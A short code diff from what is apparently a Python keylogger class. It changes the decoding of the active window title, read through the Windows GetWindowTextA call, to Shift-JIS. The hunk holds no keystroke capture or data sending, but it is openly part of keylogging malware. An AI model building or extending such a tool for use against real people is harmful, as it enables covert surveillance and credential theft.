@@ -26,7 +26,7 @@ class KeyLogger:
     window_title = create_string_buffer(512)
     windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
     try:
-      self.current_window = window_title.value.decode()
+      self.current_window = window_title.value.decode('shift_jis')
     except UnicodeDecodeError as e:
       print(f'{e}: window name unknown')
 
